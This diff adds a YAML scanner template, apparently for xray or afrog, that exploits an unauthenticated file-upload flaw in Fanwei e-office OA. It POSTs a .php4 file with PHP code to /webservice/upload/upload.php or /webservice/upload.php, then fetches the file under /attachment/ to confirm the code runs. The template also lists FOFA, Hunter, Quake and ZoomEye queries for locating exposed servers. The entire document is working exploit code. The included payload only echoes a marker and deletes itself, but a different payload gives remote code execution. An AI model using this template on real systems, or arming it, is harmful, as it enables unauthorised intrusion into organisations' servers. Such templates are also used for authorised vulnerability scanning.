@@ -1,0 +1,90 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="泛微-EOffice"
+    hunter-query: app.name=="泛微 e-office OA"
+    quake-query: app:"泛微 E-Office"
+    zoomeye-query: app:"泛微协同办公标准产品EOffice"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+
+name: poc-yaml-fanwei-e-office-webservice-upload.php-upload
+transport: http
+set:
+  s1: randomLowercase(8)
+  s2: randomInt(1000,9999)
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /webservice/upload/upload.php
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryakbyiukl
+        Accept-Encoding: gzip
+        Connection: close
+      body: |
+        ------WebKitFormBoundaryakbyiukl
+        Content-Disposition: form-data; name="file"; filename="{{s1}}.php4"
+        Content-Type: application/octet-stream
+        
+        <?php echo {{s1}};unlink(__FILE__);?>
+        ------WebKitFormBoundaryakbyiukl--
+    expression: >-
+      response.status == 200 && response.body_string.contains(string(s1))
+
+    output:
+      search: |-
+        "(?P<token>\\d{2,})".bsubmatch(response.body)
+      token: search["token"]
+  r1:
+    request:
+      cache: true
+      method: GET
+      path: /attachment/{{token}}/{{s1}}.php4
+      follow_redirects: false
+      headers: 
+      body: 
+    expression: >-
+      response.status == 200 && response.body_string.contains(string(s1))
+  r2:
+    request:
+      method: POST
+      cache: true
+      path: /webservice/upload.php
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryakbyiukl
+        Accept-Encoding: gzip
+        Connection: close
+      body: |
+        ------WebKitFormBoundaryakbyiukl
+        Content-Disposition: form-data; name="file"; filename="{{s1}}.php4"
+        Content-Type: application/octet-stream
+        
+        <?php echo {{s1}};unlink(__FILE__);?>
+        ------WebKitFormBoundaryakbyiukl--
+    expression: >-
+      response.status == 200 && response.body_string.contains(string(s1))
+
+    output:
+      search: |-
+        "(?P<token>\\d{2,})".bsubmatch(response.body)
+      token: search["token"]
+  r3:
+    request:
+      cache: true
+      method: GET
+      path: /attachment/{{token}}/{{s1}}.php4
+      follow_redirects: false
+      headers: 
+      body: 
+    expression: >-
+      response.status == 200 && response.body_string.contains(string(s1))
+
+expression: (r0() && r1() ||  r2() && r3())
